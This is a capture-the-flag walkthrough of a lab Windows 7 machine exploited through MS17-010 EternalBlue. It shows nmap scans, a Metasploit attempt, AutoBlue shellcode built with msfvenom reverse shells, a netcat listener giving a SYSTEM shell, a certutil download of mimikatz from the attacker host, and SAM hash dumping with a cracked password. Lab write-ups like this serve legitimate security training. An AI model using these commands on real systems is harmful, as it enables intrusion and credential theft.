Ethernal Blue is a simple walkthrough machine which covers a vulnerability known as EthernalBlue which was used to exploit SMB protocols.
IP:  10.10.45.174 

Nmap scan results:

Host is up (0.12s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2020-10-26T06:47:09+00:00; 0s from scanner time.
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/26%OT=135%CT=1%CU=43949%PV=Y%DS=2%DC=T%G=Y%TM=5F967
OS:129%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=2%ISR=10C%TI=I%CI=I%TS=7)SEQ(SP
OS:=107%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M505NW8ST11%O2=M505NW
OS:8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=2
OS:000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M
OS:505NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=8
OS:0%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%
OS:Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%
OS:DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIP
OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: -1s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:d6:05:af:95:cf (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-10-26T01:46:54-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-26T06:46:54
|_  start_date: 2020-10-26T06:44:35

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   133.69 ms 10.9.0.1
2   134.09 ms 10.10.45.174


1) How many ports are open with a port number under 1000?
-> 3
TO check where the machine is vulnerable to we can use --script args from nmap.
Nmap scan report for 10.10.45.174
Host is up (0.14s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 17.55 seconds


2) What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
-> ms17-010

##Gain Access
We can make use of search in metasploit to search for a particular exploit.

1) Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
-> exploit/windows/smb/ms17_010_eternalblue

2) Show options and set the one required value. What is the name of this value? (All caps for submission)
-> RHOSTS

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS  10.10.45.174 
RHOSTS => 10.10.45.174
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.9.81.62:4444 
[*] 10.10.45.174:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.45.174:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.45.174:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.45.174:445 - Connecting to target for exploitation.
[+] 10.10.45.174:445 - Connection established for exploitation.
[+] 10.10.45.174:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.45.174:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.45.174:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.45.174:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.45.174:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.45.174:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.45.174:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.45.174:445 - Sending all but last fragment of exploit packet
[*] 10.10.45.174:445 - Starting non-paged pool grooming
[+] 10.10.45.174:445 - Sending SMBv2 buffers

So for some reason the metasploit exploitation was not working so I decided to manually exploit it.
We got a script that can help us do it.
https://github.com/3ndG4me/AutoBlue-MS17-010

root@LAPTOP-U5913CMD:/opt/AutoBlue-MS17-010# ls     
LICENSE    eternal_checker.py        eternalblue_exploit7.py  listener_prep.sh  mysmb.pyc         shellcode
README.md  eternalblue_exploit10.py  eternalblue_exploit8.py  mysmb.py          requirements.txt  zzz_exploit.py
root@LAPTOP-U5913CMD:/opt/AutoBlue-MS17-010# cd shellcode/
root@LAPTOP-U5913CMD:/opt/AutoBlue-MS17-010/shellcode# ./shell_prep.sh 
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
Y
LHOST for reverse connection:
10.9.81.62
LPORT you want x64 to listen on:
3333
LPORT you want x86 to listen on:
3334
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
Generating x64 cmd shell (stageless)...

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.9.81.62 LPORT=3333
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (stageless)...

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.9.81.62 LPORT=3334
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
root@LAPTOP-U5913CMD:/opt/AutoBlue-MS17-010/shellcode# cd ..
root@LAPTOP-U5913CMD:/opt/AutoBlue-MS17-010# ls          
LICENSE    eternal_checker.py        eternalblue_exploit7.py  listener_prep.sh  mysmb.pyc         shellcode
README.md  eternalblue_exploit10.py  eternalblue_exploit8.py  mysmb.py          requirements.txt  zzz_exploit.py
root@LAPTOP-U5913CMD:/opt/AutoBlue-MS17-010# python eternalblue_exploit7.py 10.10.67.235 shellcode/sc_all.bin 
shellcode size: 2203
numGroomConn: 13
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
root@LAPTOP-U5913CMD:/opt/AutoBlue-MS17-010# 

root@LAPTOP-U5913CMD:/home/akshay/Downloads/Win32# nc -nvlp 3333
Listening on 0.0.0.0 3333
Connection received on 10.10.67.235 49169
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

Easy right.
Now we have to use mimikatz to get the sam hashes.

C:\Windows>certutil.exe -urlcache -split -f http://10.9.81.62:8000/mimikatz.exe
certutil.exe -urlcache -split -f http://10.9.81.62:8000/mimikatz.exe
****  Online  ****
  000000  ...
  0ff308
CertUtil: -URLCache command completed successfully.

C:\Windows>

C:\Windows>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x86) #19041 Sep 18 2020 19:18:00
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::sam
Domain : JON-PC
SysKey : 55bd17830e678f18a3110daf2c17d4c7
Local SID : S-1-5-21-2633577515-2458672280-487782642

SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Jon
  Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d

mimikatz # 

Jon Password - alqfna22

OK let's get the flags now.

Flag 1:
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
07/13/2009  10:20 PM    <DIR>          PerfLogs
04/12/2011  03:28 AM    <DIR>          Program Files
03/17/2019  05:28 PM    <DIR>          Program Files (x86)
12/12/2018  10:13 PM    <DIR>          Users
10/26/2020  04:15 AM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  21,100,204,032 bytes free

C:\>type flag1.txt
type flag1.txt
flag{acc############}
C:\>

Flag 3:
C:\Users\Jon\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

12/12/2018  10:49 PM    <DIR>          .
12/12/2018  10:49 PM    <DIR>          ..
03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes
               2 Dir(s)  21,100,191,744 bytes free

C:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{ad######################}
C:\Users\Jon\Documents>

I was not able to get flag2.txt so tried to find it using find method that we use in Linux.
Here we can find it using the following command:
-> dir /s/p *flag*.txt

C:\>dir /s/p *flag*.txt
dir /s/p *flag*.txt
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
               1 File(s)             24 bytes

 Directory of C:\Users\Jon\Documents

03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes

 Directory of C:\Windows\System32\config

03/17/2019  02:32 PM                34 flag2.txt
               1 File(s)             34 bytes

See it works properly just like find :P.

Flag 2:
C:\Windows\System32\config>type flag2.txt
type flag2.txt
flag{sam_####################}
C:\Windows\System32\config>

Well the manual exploitation a lot of important stuffs rather than metasploit.
Great machine... Happy Hacking :)
